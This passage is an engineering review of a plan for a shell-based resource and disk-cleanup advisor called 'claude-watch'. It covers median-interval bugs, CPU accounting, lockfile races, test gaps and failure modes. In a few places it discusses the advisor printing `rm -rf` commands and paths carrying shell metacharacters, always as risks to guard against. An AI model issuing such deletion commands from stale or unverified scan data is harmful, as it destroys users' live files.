| U3 cputime delta | pid churn inside a session tree clamps real burn to 0 | no — E-F2 |
| U3 floor/TOPN | 20 processes at 4% each = 0.8 cores, invisible, "cpu ok" | no — E-F3 |
| U4 lockfile | orphaned by SIGKILL; two winners after a stale break | no — E-F6 |
| U4 deadline | `find` blocked on a network mount; in-loop check never runs | no — E-F7 |
| U5 action print | 6h-stale `idle>14d` verdict; user pastes `rm -rf` on a hot cache | no — E-F9 |
| U2 rank | two findings, equal severity + equal share → unstable order | no — E-F10 |

### Security / threat surface

Read-only by construction (no side-effecting path in `advise`), so the surface is
**what the tool authors, not what it runs**. §3b's quote-or-refuse rule is the
right shape and is stronger than any single-layer quoting. Two residual items:
E-F9 (TOCTOU between scan and paste) and the §C3-F14 asymmetry the CEO review
already recorded (`worktrees --remove` refuses without a tty; `advise` prints an
`rm -rf` with no guard at all — mitigated to `confidence: confirmed` only, which
is the correct mitigation). `jesc()` coverage for JSON is already proven by
`tests/smoke.sh:98-114` against invalid UTF-8 and surrogates; U2 inherits it.
**No new findings.**

---

## E2. Findings

Severity + confidence per the calibration rubric. Every finding quotes the line
that motivates it.

### E-F1 — CRITICAL (9/10) — U0's histogram median must pin the exact rank and iterate numerically

`claude-watch:318-320`:
```awk
for (i = 1; i < dn; i++) for (k = i + 1; k <= dn; k++)
  if (dl[k] < dl[i]) { t = dl[i]; dl[i] = dl[k]; dl[k] = t }
iv = (dn > 0) ? dl[int(dn / 2) + 1] : 10
```
The current median is the element at 1-based rank `int(dn/2)+1` of an **ascending**
sort — the upper median. §6 U0 says only "walk the buckets to the middle", which
is not a specification. Two concrete ways the rewrite diverges:

1. **Rank slip.** `cumulative > dn/2` is *equivalent* to `cumulative >= int(dn/2)+1`
   for integer `dn` (verified algebraically and against today's real distribution:
   `dn=4340`, rank 2171, both formulations return 10). But `cumulative >= dn/2` —
   the natural thing to type — picks the wrong bucket for every even `dn`.
2. **Iteration order.** `for (g in hist)` is undefined-order in awk and produces a
   wrong cumulative walk. It must be `for (g = 1; g < 600; g++)`.
3. **The `dn == 0` fallback `iv = 10` must survive** (single sample, or every gap
   ≥ 600s — a laptop woken once).

`iv` multiplies into `interval_seconds`, `observed_seconds` (`covered = sysn*iv`,
`:321`), `active_seconds` (`sn[key]*iv`, `:223`) and `cpu_seconds` (`psum[key]*iv`,
`:233`). An off-by-one bucket silently rescales the entire report and every §5
threshold decision downstream.

**Required:** §6 U0 states the rank as `int(dn/2)+1`, the first bucket whose
cumulative count reaches it, a numeric `1..599` walk, and the `iv=10` fallback.
Fixture asserts an even-`dn` case where the two formulations differ.

### E-F2 — CRITICAL (8/10) — cumulative-CPU differencing is worse than `%cpu` for `session` rows

§6 U1 concedes the mechanism and then under-rates it: *"when a child exits between
samples, its time leaves the tree total and the raw delta goes negative. The clamp
at 0 is required."* For a Claude session that is not an edge case, it is the
common case. `tools/sample.sh:155` emits the session row as `subcpu(p)/100` — a
whole-tree roll-up (`sample.sh:118`). A tree-cumulative equivalent drops by the
departing child's **entire lifetime CPU** the moment it exits, so an interval in
which the session burned 5 CPU-seconds and reaped a child holding 30 reads
`max(0, -25) = 0`. Sessions doing heavy short-lived work — the ones the tool
exists to catch — report **zero sustained CPU**. `%cpu`, a decaying average, sees
them; that is exactly the argument §6 U1 already makes for keeping `%cpu`.

Separately, §6 U1 says the delta is taken *"per name-identity"*. For `proc` rows
that is wrong too: `sample.sh:174` emits one row **per pid** (`p` is field 6), and
the same name is often many pids (`report`'s `flush()` at `claude-watch:188-197`
exists precisely because of this). Differencing a per-name **sum over a varying
pid set** produces a spurious spike the moment a new pid enters (its whole
lifetime CPU lands in one interval) and a clamped-to-zero loss when one leaves.

**Required, all three:**
- `proc` rows: difference **per pid**, then fold by name. Not per name.
- `session` rows: keep `%cpu` as the basis; `cpu_basis` becomes per-section, not
  one global value. (Alternative — record tree cumulative *and* a children-exited
  flag — is more code for a number that is still lossy.)
- A universal sanity invariant, cheap and catches every variant of this bug:
  **no per-interval `cpu_seconds` may exceed `interval × ncpu`.** Exceeding it
  means the identity changed; fall back to `pcpu × interval` for that interval and
  count it toward `mixed`.

### E-F3 — HIGH (9/10) — the CPU domain cannot see below the sampler's floor, and §5 does not say so

`tools/sample.sh:13-15`:
```sh
FLOOR="${CLAUDE_WATCH_FLOOR:-5}"            # %CPU of one core
MEMFLOOR="${CLAUDE_WATCH_MEMFLOOR:-409600}" # RSS in KB
TOPN="${CLAUDE_WATCH_TOPN:-8}"              # cap on machine-wide rows per sample
```
and `sample.sh:172-180` emits at most `TOPN` CPU rows and `TOPN` memory rows per
sample. So machine-wide `proc` data is **truncated twice**: everything under 0.05
cores is absent, and on a busy sample the 9th consumer is absent.

Consequences the plan does not state:
- §5's `cpu.sustained` `info` line is `>= 0.05` cores — numerically identical to
  the floor. A process sustained at exactly that level is at the edge of
  visibility, so the `info` band is largely unreachable by construction.
- Twenty processes at 4% each burn 0.8 cores and produce **zero rows**. The domain
  emits `S cpu ok`. That is the exact failure §3b calls "the failure this whole
  tool exists to prevent, reproduced one level up" — and §5's caveat only mentions
  GPU/ANE.
- Every `share_of_domain` for cpu is a lower bound, not a share.

**Required:** the `cpu` summary caveat (§5) extends to
`CPU time only; per-process rows below CLAUDE_WATCH_FLOOR (0.05 cores) and beyond
the top CLAUDE_WATCH_TOPN per sample are not recorded; GPU/ANE power is not
measured`. And the honest cross-check is already in the data for free: the `sys`
row carries **load average** (`$4`, `claude-watch:262`). When peak/median load is
high while no `proc` row explains it, say so instead of `ok`. Add
`cpu.unexplained_load` as a finding id.

### E-F4 — HIGH (9/10) — §3 does not pin the shared denominators, and the month path reads the window twice

§3b passes exactly one thing to the cpu/mem analyzer: *"`advise_cpumem` reads the
window TSV on stdin and `CW_WINDOW_SECONDS` from env."* But §4 and §5 require, in
the analyzer:

| quantity | needed by | in the contract? |
|---|---|---|
| derived interval `iv` | `cpu_seconds = pcpu × iv` | **no** |
| `observed_seconds` | every rate in §4 | **no** (§3d has it at top level) |
| `ncpu` | `share = cores/ncpu`, `cpu.spike >= 0.8×ncpu` | **no** |
| `memsize_kb` | `share = rss/memsize`, `mem.holder` | **no** (and see E-F5) |
| `volume_total_kb` | **leaks** worktree share (§4) | **no** — U6 needs U5's denominator |

Two units independently deriving `iv` and `observed_seconds` is a third
implementation of the logic U0 is currently rewriting, and it can disagree with
the top-level `observed_seconds` in the same JSON document. The leaks row is worse:
`reclaim_kb / volume_total_kb` with a missing disk cache is a **division by zero →
`nan` → invalid JSON**, which §9 explicitly forbids.

**Required:**
- U2 derives the four scalars once and exports `CW_INTERVAL_SECONDS`,
  `CW_OBSERVED_SECONDS`, `CW_SAMPLES`, `CW_NCPU`, `CW_MEMSIZE_KB`,
  `CW_VOLUME_TOTAL_KB`. Analyzers never re-derive.
- Any share whose denominator is 0 or absent is emitted as `0`, never computed.
  Severity still comes from the absolute threshold, which needs no denominator.
- **Single pass.** The window must be read once. As written U2 reads it for the
  metadata and U3 reads it again on stdin: for `--window month` that is 2 × 3.8M
  rows plus 28 `gzcat`. Measured baseline: 60k rows read+filter = 0.07s → ~4.4s
  per pass before any aggregation, against a §1 budget of 5s **total**. Fold the
  metadata derivation into the same awk program that U3 runs and emit it as `M`
  rows ahead of the `S`/`F` rows. Simpler, faster, and it deletes the duplicate.

### E-F5 — HIGH (10/10) — three §5 thresholds cannot be computed from the sample schema

Checked every §5 threshold against the live schema (`sys/8 session/7 proc/6
orphan/6`, verified by field-counting today's 64,764-row file).

| threshold | needs | present? |
|---|---|---|
| `mem.holder.<name>` `rss >= 40%` of physical | `memsize_kb` | **absent** |
| `mem.swap_cap` swap `>= 75%` of cap | swap **total** | **absent** |
| memory `share_of_domain` = `rss/memsize_kb` | `memsize_kb` | **absent** |
| `mem.pressure` `min_free`, sub-500M fraction | `$6` free_kb | ok |
| `mem.pressure` pageout delta | U1(b) | ok, once U1 lands |
| `cpu.*` | `$4` cores, `$8` ncpu | ok (with E-F3's caveat) |
| `leaks.*` | `scan_orphans` / `scan_worktrees` | ok |
| `disk.*` | `disk-scan.sh` | ok |

The sampler already fetches both missing values and throws them away:
```sh
# tools/sample.sh:72-73
sys=$(vm_stat ... | awk -v ps="$(sysctl -n hw.pagesize)" \
        -v total="$(sysctl -n hw.memsize)" -v swap="$(sysctl -n vm.swapusage)" '
```
`total` is passed into the awk program and **never referenced in its body** (grep
of `tools/sample.sh` returns only line 73). And `swap` is parsed at `:83-85` for
the `used` token only, discarding `total = 2048.00M`.

**Required:** U1 appends `memsize_kb` and `swap_cap_mb` to the `sys` row in the
same edit as the pageout counters. Otherwise U3 must shell out to `sysctl` at read
time — which reports *this* machine's RAM for a window that may predate a hardware
change, and breaks the "digests are derived from stored facts" invariant
(HANDOFF §2, invariant 2). One edit, one unit, zero extra passes.

### E-F6 — HIGH (8/10) — the disk-scan lockfile protocol is unspecified and split across two units

§1 assigns the lock to the caller (*"a lockfile in `$DATA/state/` with a stale-lock
timeout, and 'a scan is already running, using the stale cache' on stderr for the
loser"*); §6 U4 assigns it to the scanner (*"the 120s deadline, the
`partial`/`deadline_hit` flags, and the `$DATA/state/` lockfile all live here"*).
Two units, one resource, no named path and no named mechanism.

Three concrete races follow: `[ -f lock ] && exit` / `touch lock` is TOCTOU (both
runs proceed); a stale-lock breaker with no ownership check lets two processes
break the same lock and both proceed; and `kill -9` or a panic leaves the lock
forever, after which every `advise` silently uses a stale cache and never
rescans — a permanent silent degradation with no symptom.

**Required:** lock lives in `disk-scan.sh` only; `advise` never touches it and
learns the outcome from the scanner's exit code. Mechanism pinned: `mkdir
"$STATE/disk-scan.lock"` (atomic on APFS), pid written inside, `trap ... EXIT INT
TERM` removes it, and the stale breaker requires **both** age > 120s **and**
`kill -0 <pid>` failing. `doctor` gains a check for an orphaned lock.

### E-F7 — HIGH (8/10) — a self-enforced deadline cannot preempt a blocked syscall

§1: *"Disk scan deadline: 120s wall clock, enforced by the scanner itself, not by
a caller's timeout"*, motivated by *"a root on a slow or network mount otherwise
hangs an interactive command with no exit but Ctrl-C."* An in-loop
`[ $SECONDS -gt 120 ] && break` only runs **between** `find`/`du` invocations. The
stated failure mode is a single `find` or `du` blocked in uninterruptible I/O on a
network mount — which is precisely when the loop body never returns. As specified
the deadline does not fire on the one case it was written for.

**Required:** the deadline stays the scanner's responsibility but is implemented as
an internal watchdog — the walk runs in a background subshell, the parent polls to
the deadline and kills the worker, then writes what landed with `partial=1` and
`deadline_hit=1`. Also: §6 U4 gives `du` `-x` but the `find` gets no `-xdev`, so
`find` descends the network mount before `du` ever runs. Add `-xdev`.

### E-F8 — MEDIUM (8/10) — NF era detection is right, with two holes worth closing

Verified against live data: `proc` and `orphan` rows **both** have NF=6, so
detection must be per-kind — which §6 U1 already says (*"the analyzer counts
fields (`NF`) per row kind"*). That part is correct and better than empty-string
testing. Two holes:

1. **A truncated final row reads as old-era.** The sampler appends with `>>` from
   awk (`sample.sh:190`); a machine that panics mid-write leaves a short line, and
   short = "fewer fields" = "estimate era". Silent, and it moves a number.
   *Fix:* era detection requires NF ≥ expected **and** the new field matching
   `^[0-9]+:[0-9]{2}\.[0-9]{2}$`; otherwise the row is estimate-era.
2. **NF is a one-shot signal.** The next schema addition makes `NF=7` ambiguous
   between "cputime proc" and "cputime+something proc".
   *Fix:* U1 also appends a schema version to the `sys` row. Existing readers are
   unaffected — `report`'s main loop ignores trailing fields, and an unknown row
   kind falls through harmlessly (`claude-watch:255-293`).

Format claim independently verified: 2,000+ live `ps -Ao time=` values are all
2-field `MMMM:SS.hh` (largest seen `968:13.77`), and `esec()` (`sample.sh:99-105`)
parses that branch correctly — `148:08.43` → 8888.43s. The fixture §6 U1 specifies
is the right one; keep it.

### E-F9 — MEDIUM (7/10) — TOCTOU between the disk scan and the command the user pastes

The `confidence: confirmed` verdict depends on *"newest mtime at depth 1 older than
14d"* (§3c), evaluated at scan time. The cache is used for **6h** silently and
beyond 6h with a `stale` flag. A `cargo build` an hour ago makes the printed
`rm -rf '.../target'` a live-cache deletion, and the tool authored it.

**Fix (cheap, bounded):** re-`stat` the marker and depth-1 mtime **at print time**
for the findings that actually carry a removal command — at most a handful of
`stat` calls, not a rescan. If the idle test no longer holds, downgrade to `likely`
and drop the command. Print the cache age beside every command regardless.

### E-F10 — MEDIUM (7/10) — intra-domain ordering has an unpinned tie-break

§4 sorts by `(severity_rank, share_of_domain)` descending. §3d congratulates itself
that *"`domains` is an array... so awk's undefined array iteration order cannot leak
into the contract"* — the identical hazard one level down, in `findings[]`, is left
open. Two findings at equal severity and equal share (trivially: two groups both
rounding to 0.00, or two orphan trees of the same size) order nondeterministically
under a hand-rolled unstable sort, and the fixtures become flaky.

**Fix:** third sort key, `id` ascending (ASCII). One line, and it makes every
fixture's expected output exact.

### E-F11 — MEDIUM (7/10) — `disk.volume_low`'s `or` makes every large volume permanently critical

§5: critical `< 10%` **or** `< 25GiB`; warn `< 20%` **or** `< 50GiB`. On the
measured 422GiB volume, 10% = 42GiB, so the GiB test never binds — the percentage
decides. On a 4TB volume, 10% = 400GiB: 399GiB free reports `critical`. That is G1's
deleted failure — a constant verdict wearing a number's clothes — returning inside
the disk domain.

**Fix:** `and`, not `or`: critical when `avail_pct < 10%` **and** `avail < 25GiB`.
On a 100GB volume the absolute test binds (alert under 10GB); on a 4TB volume the
percentage stops screaming. Folds into open decision 1.

### E-F12 — MEDIUM (6/10) — `-maxdepth 4` silently undercounts; groups can double-count

§6 U4's bounded walk stops at depth 4 below each repo root, so
`repo/packages/app/services/node_modules` is invisible. That is defensible as a
bound, but the resulting `reclaim_kb` is a **floor** and the output does not say so
(only the `partial=1` path labels floors). Separately, if a user points
`CLAUDE_WATCH_REPO_ROOTS` at `$HOME`, the repo pass and the fixed shortlist
(`~/Downloads`, `~/Library/Caches`, …) overlap and group totals double-count.

**Fix:** label reclaim totals as a floor unconditionally (one word in the summary);
dedupe hits by resolved path prefix before summing; assert `sum(groups) <= used_kb`
as a scanner-side sanity check.

### E-F13 — LOW (8/10) — pre-existing: `minfree` cannot record a genuine zero

`claude-watch:263`: `if (minfree == 0 || $6 + 0 < minfree) minfree = $6 + 0`. A
sample reporting free = 0 leaves `minfree == 0`, so the next sample overwrites it
unconditionally and `min_free_kb` ends up as the last sample's value rather than
the minimum. Pre-existing, outside this plan's diff, and directly under §5's
`mem.pressure` `min_free < 100M` test. Flagged, not fixed here (see-something-
say-something); the memory analyzer must not copy the idiom.

---

## E3. Test review

### Framework

No CLAUDE.md testing section. Detected: `tests/smoke.sh`, a hand-rolled bash
harness (`ok`/`bad`/`skp`, `expect_exit`, `expect_json`), 162 lines, read-only,
exit non-zero on any failure. No node/python/ruby/go/rust project files. The plan's
`tests/fixture-*.sh` convention plus one `smoke.sh` loop is the right extension —
it reuses the existing harness rather than introducing a framework.

### Coverage diagram

```
CODE PATHS                                                  USER / AGENT FLOWS
[~] claude-watch report()  END block                        [+] `claude-watch advise`
  ├── epoch min/max/out-of-order (U0)                          ├── [GAP] 24h default,
  │   ├── [GAP]  ordered input == old output (golden)          │      populated machine
  │   ├── [GAP]  out-of-order input detected + reported        │      [→E2E manual]
  │   └── [GAP]  single sample (dn==0 → iv=10)                 ├── [GAP] --window week
  ├── median gap histogram (U0)                                │      over 2 days of data
  │   ├── [GAP]  even dn where >= vs > diverge   ★CRITICAL     ├── [GAP] --window month
  │   ├── [GAP]  numeric 1..599 walk, not for-in               │      (clamp + shortfall)
  │   ├── [GAP]  all gaps >= 600 (sleep) → iv=10               ├── [GAP] sampler stopped
  │   └── [GAP]  60k rows < 5s  (timing)     [plan has this]   │      → no bare all-clear
  ├── lastep = running max                                     ├── [GAP] --json parses
  │   └── [GAP]  orphan still_alive unchanged                  │      (smoke, all windows)
  └── rankings :325-332 (unchanged)                            ├── [GAP] --kill/--remove/
      └── [n/a] out of U0 scope, stated                        │      --yes rejected → 2
                                                               └── [GAP] --window bogus → 2
[~] tools/sample.sh  (U1)
  ├── ps field shift $6→$7 / i<=5→i<=6
  │   ├── [GAP]  claude roots still detected      [plan has this]
  │   ├── [GAP]  argv with spaces survives        [plan has this]
  │   └── [GAP]  argv with a leading '(' (ps parenthesised)   ← NOT in plan
  ├── esec() on TIME
  │   └── [GAP]  0:00.00 / 1:23.45 / 148:08.43 / 1234:56.78   [plan has this]
  ├── pageins/pageouts via /^Pageins/ $2          [plan has this]
  ├── memsize_kb + swap_cap_mb on sys row  (E-F5) ← NOT in plan
  │   └── [GAP]  NF=10..12, values match sysctl
  └── schema marker (E-F8)                        ← NOT in plan
      └── [GAP]  report --json byte-identical after the sampler change  ★CRITICAL

[+] tools/advise.sh  (U2)
  ├── cw_read_window
  │   ├── [GAP] .tsv and .tsv.gz same day, read once  [plan has this]
  │   ├── [GAP] cutoff selects exactly planted rows   [plan has this]
  │   ├── [GAP] gzcat non-zero exit → domain partial  (§9) ← no fixture named
  │   └── [GAP] month window, 2 day files → available/covered/requested
  ├── window metadata (iv, observed, samples, ncpu, memsize, volume_total)
  │   ├── [GAP] exported to analyzers, single source   (E-F4) ← NOT in plan
  │   └── [GAP] observed_seconds == 0 → no division, cpu/mem unknown  (§9)
  ├── ranking + headline
  │   ├── [GAP] fixed domain order cpu→memory→disk→leaks
  │   ├── [GAP] severity then share then id tie-break  (E-F10) ← NOT in plan
  │   └── [GAP] all domains ok → headline says so, 4 sections still print
  ├── emitter
  │   ├── [GAP] tab/newline inside an analyzer field   (E-F14) ← NOT in plan
  │   ├── [GAP] path with ' and ; → quoted / refused   [plan has this, U4 side]
  │   └── [GAP] jesc on every user-derived string, python json.load
  └── exit codes 0 / 2 usage / 1 unreadable data dir  [plan has this]

[+] tools/advise-cpumem.sh  (U3)
  ├── same-name fold per sample (no seen% > 100, no RSS sum)  [plan has this]
  ├── final flush closes the last sample                       ← implied by the
  │                                                              100×0.5 fixture
  ├── cputime era
  │   ├── [GAP] per-PID delta, not per-name           (E-F2) ← NOT in plan
  │   ├── [GAP] child exits → clamp at 0              [plan has this]
  │   ├── [GAP] new pid enters → no lifetime spike    (E-F2) ← NOT in plan
  │   └── [GAP] delta > interval × ncpu → fall back   (E-F2) ← NOT in plan
  ├── estimate era only → cpu_basis estimate         [plan has this]
  ├── mixed era → boundary interval uses pcpu×iv     [plan names the fixture,
  │                                                    not the assertion]
  ├── thresholds at ±1 of every §5 boundary          [plan has this]
  ├── cpu ok carries the GPU/ANE + floor caveat      (E-F3) ← caveat incomplete
  └── [GAP] high load, zero proc rows → not "ok"     (E-F3) ← NOT in plan

[+] tools/disk-scan.sh  (U4)
  ├── synthetic tree: confirmed / likely / unverified [plan has this]
  ├── metacharacter path → no command                 [plan has this]
  ├── decoy repo/src absent                           [plan has this]
  ├── [GAP] lock held → second run exits without scanning  (E-F6)
  ├── [GAP] stale lock with dead pid → broken and scanned  (E-F6)
  ├── [GAP] deadline fires → partial=1, deadline_hit=1, cache still written
  ├── [GAP] mv fails (read-only $STATE) → reported, not swallowed  [§6 names
  │         the requirement, no fixture]
  └── [GAP] temp file created in $STATE, not /var/folders (atomic mv) ← NOT in plan

[+] tools/advise-disk.sh  (U5)
  └── 4.7% / 15% / 60% / 2% boundary / missing / partial / malformed
      + one dir row per confidence                    [plan has all of these ★★★]

[+] tools/advise-leaks.sh  (U6)
  ├── 2h 300M → warn; 10min 5M → info; empty → ok     [plan has this]
  ├── [GAP] scan_worktrees 9-column shape pinned in a fixture  (E-F15)
  └── [GAP] volume_total_kb absent → share 0, no nan   (E-F4)

COVERAGE: plan names 31 assertions across 7 fixture files; this review adds 22.
GAPS: 22 (0 need E2E automation — 3 are documented manual checks; 0 evals)
CRITICAL (regression class): 2 — U0 golden-file, U1 sampler-change golden-file
```

### E-F14 — HIGH (8/10) — §3b's sanitisation ownership is self-defeating

§3b: *"Output is TSV on stdout"* … *"Text fields: the emitter strips
tabs/newlines; U2 owns that, analyzers do not need to."* An emitter that parses a
tab-separated stream has already mis-split a row containing a tab before it can
strip anything. A process name or path with a tab shifts every subsequent field by
one — `severity` reads as a number, `share` as text — and the finding is silently
garbage rather than an error.

**Fix:** analyzers strip `\t` and `\n` **before emitting**, exactly as
`sample.sh:121` `clean()` already does for the raw rows. U2 strips only for display
and JSON. This is one sentence in §3b and it reverses the current one.

### E-F15 — MEDIUM (7/10) — U6 consumes an unpinned TSV shape

`claude-watch:986-987` emits 9 fields:
`st, path, main, branch, age, dirty, unpushed, size, why`. `scan_orphans`
(`claude-watch:445-450`) emits `T`/`P` rows with documented shapes. §3b tells U6 to
consume these *"as-is, including the corrected `unpushed` number from the separate
PR"* but never writes the column list down. U6's fixtures are captured output; if
the separate PR changes column count or order the fixtures pass while live runs
break.

**Fix:** §3 gains the two shapes verbatim, and U6's fixture asserts the column
count against a live `scan_worktrees 7 | head -1` so drift fails loudly.

### REGRESSION RULE — two mandatory golden-file tests (no question asked)

Both units modify existing behaviour whose current output has no test:

1. **U0** — `report --json` for a given day file must be **byte-identical** before
   and after. §6 U0 delegates this to the separate PR's `tests/fixture-report.sh`,
   whose stated scope (HANDOFF §7a) is *"peak/avg/total/seen figures"* — which does
   not obviously include `interval_seconds`, `observed_seconds` or `still_alive`,
   the three fields U0 can actually break. **U0 commits its own golden file**: a
   small real day-file fixture plus the pre-change `report --json` output, diffed
   in `tests/fixture-aggregation.sh`. This also removes the cross-PR merge edge
   from U0's critical path (E-D3).
2. **U1** — the same golden diff after the sampler schema change, proving `report`
   is unaffected by the appended fields on all four row kinds. Verified by reading
   `claude-watch:255-293`: `report` uses `sys $4-$8`, `session $3-$7`, `proc
   $3,$4,$5`, `orphan $3,$5,$6`, and ignores trailing fields — so this should pass,
   and the test is what proves it stayed true.

---

## E4. Code quality

**DRY — three genuine repetitions, one already known.**

1. **Interval / observed_seconds derivation** — `report()` (U0), U2's window
   metadata, and U3's pass. Three copies of the logic being rewritten *right now*
   because it was wrong in the one place it existed. §8's open decision 2 names
   only the U3-vs-`report` duplication and misses U2 entirely. *Recommendation:*
   E-F4's single pass collapses U2 and U3 into one; the remaining `report`-vs-
   `advise` split is acceptable (different outputs, both fixture-timed).
2. **Sampler-liveness threshold** — `status()` uses `age < 120` twice
   (`claude-watch:1297, 1302`). §3d's `freshness.sampler_ok` must reuse that number,
   not invent a second one. One constant, referenced twice.
3. **Text sanitisation** — `clean()` (`sample.sh:121`) and the `tr
   '\001-\037\177'` idiom in `orphans` already exist. E-F14's fix should call the
   same shape, not author a third.

**Over/under-engineering.** Right-sized overall. `confidence: confirmed | likely |
unverified` is the strongest idea in the plan — two independent tests, and a
name-only match never earns a command. Keep it exactly as specified. Nothing reads
as premature abstraction.

**Error handling.** §9 is unusually good: it enumerates the *confidently wrong*
class first, which is the right ordering for a diagnostic. Two additions from this
review: a truncated sample row (E-F8) and a missing shared denominator (E-F4) both
belong in §9's list.

**Stale diagrams.** `HANDOFF §2`'s architecture block and `§8`'s cheat-sheet both
predate `advise`/`disk`; §6 U7 already schedules both. `HANDOFF §4.1` says *"Use
`$6` (first token of argv)"* — U1 invalidates that sentence and U7's HANDOFF edit
must correct it, or the next implementer re-introduces the bug the note exists to
prevent. Not currently in U7's list. **Added.**

**New inline diagrams to author** (the plan asks which files earn them):
- `tools/advise.sh` — the S/F row pipeline, ranking, headline selection.
- `tools/disk-scan.sh` — lock → walk → deadline → atomic write state machine.
- `claude-watch` `report()` END block — a 4-line note on why epochs need no sort
  and how the histogram median maps to the old `dl[int(dn/2)+1]`. Without it the
  next reader "helpfully" restores a sort.

---

## E5. Performance

**The O(n²) diagnosis is correct and independently reproduced.** `time
./claude-watch report today --json` on today's 64,764-row / 4,341-sample file:
**3.97s**, 100% CPU, matching the plan's 3.64s@4,191 within measurement noise. Both
selection sorts (`claude-watch:305-306` epochs, `:318-319` gaps) are unguarded
`O(n²)` over arrays that grow with sample count. The three ranking sorts at
`:325-332` are over distinct names — today 4,341 samples produce only a few hundred
distinct keys — and correctly stay.

Live gap histogram, measured: `{10: 3669, 11: 670, 12: 1}` across `dn=4340`. Three
buckets. The histogram is not merely linear, it is nearly free — and it confirms
the `< 600` bound holds in practice.

**Memory.** The rewrite should also delete `eps[]` and `sysseen[]`, not just their
sorts. For a month window `sysseen` holds ~259k awk hash entries (~25MB) for no
reason: rows are ordered, so `ep != prev_ep` dedupes in O(1) memory. That makes the
aggregator constant-memory in sample count. Not in §6 U0 — **added.**

**The month budget is the one number that does not survive.** §1 budgets ≤5s for a
month aggregation. Measured read+filter is 0.07s/60k rows → ~4.4s for 3.8M rows
*per pass*, before aggregation, before `gzcat` on ~28 files. The plan as written
implies two passes (E-F4). Single-pass gets it to roughly one read plus decompress;
realistic target is **≤10s for a month, ≤2s for a day**, measured not estimated,
and the fixture asserts the shape (linear) rather than a wall-clock number that
varies by machine. Restate §1's budget honestly rather than shipping against a
number the first real month run will miss.

**Caching.** The 6h disk TTL is right. No other caching opportunity worth taking:
the window read is already the cheap half, and caching aggregated windows would
reintroduce the state the sampler invariant exists to avoid.

---

## E6. Failure-modes registry

`T` = a test covers it · `E` = error handling exists · `V` = the user sees it.
**CRITICAL GAP** = no test **and** no handling **and** silent.

| # | codepath | failure | T | E | V | verdict |
|---|---|---|---|---|---|---|
| 1 | U0 median | `>=`/`>` slip rescales every rate | after E-F1 | n/a | no | **CRITICAL GAP** as written |
| 2 | U0 histogram | `for (g in hist)` unordered walk | after E-F1 | no | no | **CRITICAL GAP** as written |
| 3 | U0 epochs | out-of-order rows → wrong gaps | added | yes (§6 U0 says report it) | yes | covered after E-F1 |
| 4 | U1 offsets | only one of the two edited | yes (§6 U1) | no | yes (roots empty) | covered |
| 5 | U1 esec | TIME parsed as `hh:mm:ss` → 60× wrong | yes (§6 U1) | no | no | covered by fixture |
| 6 | U3 cputime | session-tree child exit clamps burn to 0 | no | clamp exists | no | **CRITICAL GAP** → E-F2 |
| 7 | U3 cputime | per-name delta spikes on a new pid | no | no | no | **CRITICAL GAP** → E-F2 |
| 8 | U3 floor | sub-floor burn invisible → `cpu ok` | no | no | no | **CRITICAL GAP** → E-F3 |
| 9 | U3/U6 share | missing denominator → `nan` → invalid JSON | no | §9 forbids it, unassigned | no | **CRITICAL GAP** → E-F4 |
| 10 | U1/U3 era | truncated row reads as estimate-era | no | no | no | **CRITICAL GAP** → E-F8 |
| 11 | U2 emitter | tab inside a field shifts every column | no | no | no | **CRITICAL GAP** → E-F14 |
| 12 | U4 lock | orphaned lock → permanent stale cache | no | no | no | **CRITICAL GAP** → E-F6 |
| 13 | U4 deadline | blocked syscall, deadline never fires | no | partial | Ctrl-C only | **CRITICAL GAP** → E-F7 |
| 14 | U4 mv | temp on another volume → non-atomic | no | §6 says detect | yes | gap, low blast radius |
| 15 | U5 action | 6h-stale idle verdict → hot cache deleted | no | no | no | **CRITICAL GAP** → E-F9 |
| 16 | U2 rank | unstable tie order → flaky fixtures | no | no | no | gap → E-F10 |
| 17 | U5 threshold | `or` → permanent critical on large volumes | no | n/a | yes (wrongly) | gap → E-F11 |
| 18 | U4 depth | nested hits missed, total is a silent floor | no | no | no | **CRITICAL GAP** → E-F12 |
| 19 | U6 shape | scan_worktrees columns drift | no | no | no | gap → E-F15 |
| 20 | window | `gzcat` fails → silently short window | §9 names it | §9 names it | yes | no fixture named — add |
| 21 | window | zero samples → division by zero | §9 + U2 fixture | yes | yes | covered ★★★ |
| 22 | sampler | dead sampler → mostly-`ok` payload | §9 + U2 fixture | yes | yes | covered ★★★ |
| 23 | window | month requested, 2 days exist | §9 + U2 fixture | yes | yes | covered ★★★ |
| 24 | U5 cache | malformed/truncated cache → garbage findings | yes (U5) | yes | yes | covered ★★★ |

**11 CRITICAL GAPS** in the plan as written. All eleven close with the fixes named
in §E2/§E3; none requires new architecture.

---

## E7. NOT in scope

| # | item | why deferred |
|---|---|---|
| E-N1 | The `unpushed` fix and `report` aggregation fixtures | G4 — separate PR, already in flight |
| E-N2 | GPU / ANE power measurement | HANDOFF §7c — needs a privileged helper; the caveat text is the mitigation |
| E-N3 | Unit unification between `claude-top` (%) and `claude-watch` (×) | HANDOFF §7b — cosmetic, touches a file no unit owns |
| E-N4 | Retention running outside the shell hook | HANDOFF §7d — real, unrelated to `advise` |
| E-N5 | Fixing `minfree`'s zero handling (E-F13) | pre-existing bug outside this diff; flagged, not bundled |
| E-N6 | Extracting `CW_WINDOW_AWK` as a shared constant (§8 open decision 2's alternative) | E-F4's single pass removes the duplication that motivated it |
| E-N7 | Transcript deletion commands | §8 open decision 4 — report-only stands |
| E-N8 | Background / scheduled disk refresh | §1 — violates the stateless-sampler invariant |
| E-N9 | Per-app breakdown of `~/Library/Containers` | §3c — single total, TCC-hostile to walk |
| E-N10 | Re-deriving severity model-side in the skill | §6 U7 — the skill relays, deliberately |

## E8. What already exists

| sub-problem | existing code | plan's handling |
|---|---|---|
| day-file reading incl. gzip | `read_day` `claude-watch:141-146` | **reused** by `cw_read_window` ✓ |
| JSON string escaping | `JESC_AWK` `claude-watch:88-130` | **reused**, already fixture-proven `smoke.sh:98-114` ✓ |
| same-name fold, RSS non-summing | `flush()` `claude-watch:188-197` | **re-implemented** in U3 — accepted (open decision 2), fixture-guarded |
| interval derivation | `claude-watch:316-321` | **re-implemented** in U2/U3 — collapse per E-F4 |
| orphan classification | `scan_orphans` `claude-watch:452` | **reused** verbatim ✓ |
| worktree classification + liveness | `scan_worktrees` `claude-watch:935` | **reused** verbatim ✓ |
| sampler-liveness threshold | `status()` `claude-watch:1297,1302` (`age < 120`) | should be **reused**, currently unstated |
| temp-file cleanup on Ctrl-C | `tmp_cleanup` `claude-watch:438-444` | **reused** by U4 ✓ |
| `is_uint` argument validation | `claude-watch:434` | **reused** for `--window` ✓ |
| control-byte stripping for terminals | `orphans` render | **reused** per §3b ✓ |
